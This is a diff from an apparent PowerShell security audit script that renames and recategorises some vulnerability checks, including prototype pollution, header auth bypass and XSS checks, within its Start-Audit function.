@@ -17393,7 +17784,7 @@ function Start-Audit {
         Write-Host "=====================================" -ForegroundColor Yellow
         try { Test-CVE2025EPM } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE7" -CheckName "CVE-2025 EPM Vulnerabilities" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
         try { Test-CVE2025SecretsManager } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE12" -CheckName "CVE-2025 Secrets Manager Vulnerabilities" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
-        try { Test-CVE202438996 } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE15" -CheckName "CVE-2024-38996 Prototype Pollution" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
+        try { Test-PrototypePollution } catch { Add-SkippedCheck -Category "Third-Party Vulnerabilities" -CISControl "TP2" -CheckName "ag-grid Prototype Pollution" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
         try { Test-CA25Bulletins } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "CA25-32" -CheckName "CA25 Security Bulletins" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
     }
     else {
@@ -17401,12 +17792,12 @@ function Start-Audit {
             -CheckName "CVE-2021-31796 (SSRF)" `
             -Reason "Skipped via -SkipCVEChecks parameter" `
             -Type "Skipped"
-        Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE2" `
-            -CheckName "CVE-2022-22536 (Auth Bypass)" `
+        Add-SkippedCheck -Category "Blackbox Testing" -CISControl "BB12" `
+            -CheckName "Header Auth Bypass" `
             -Reason "Skipped via -SkipCVEChecks parameter" `
             -Type "Skipped"
-        Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE3" `
-            -CheckName "CVE-2023-43903 (XSS)" `
+        Add-SkippedCheck -Category "Blackbox Testing" -CISControl "BB13" `
+            -CheckName "XSS Patterns" `
             -Reason "Skipped via -SkipCVEChecks parameter" `
             -Type "Skipped"
         Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE5" `
